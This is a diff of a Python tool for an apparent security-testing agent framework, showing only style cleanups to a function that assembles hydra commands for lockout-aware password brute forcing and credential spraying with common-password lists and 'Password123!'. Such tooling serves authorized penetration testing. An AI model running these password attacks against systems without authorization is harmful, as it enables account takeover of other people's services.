@@ -1,7 +1,5 @@
 """Smart password attacks — lockout-aware brute force and credential spraying."""
 
-import time
-
 from kryon.sdk.agents import function_tool
 from kryon.tools.common import run_command
 
@@ -53,22 +51,26 @@ def smart_password_attack(
     # Build hydra command with lockout-aware parameters
     cmd_parts = [
         "hydra",
-        f"-t 1",  # Single thread to respect delays
+        "-t 1",  # Single thread to respect delays
         f"-W {delay}",  # Wait between attempts
-        f"-F",  # Stop on first found
-        f"-o hydra-results.txt",
+        "-F",  # Stop on first found
+        "-o hydra-results.txt",
     ]
 
     if strategy in ("auto", "dictionary"):
-        cmd_parts.extend([
-            "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
-            "-P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
-        ])
+        cmd_parts.extend(
+            [
+                "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+                "-P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
+            ]
+        )
     elif strategy == "spray":
-        cmd_parts.extend([
-            "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
-            "-p 'Password123!'",
-        ])
+        cmd_parts.extend(
+            [
+                "-L /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+                "-p 'Password123!'",
+            ]
+        )
 
     cmd_parts.append(f"{target}")
     cmd_parts.append(f"{config['hydra_module']}")
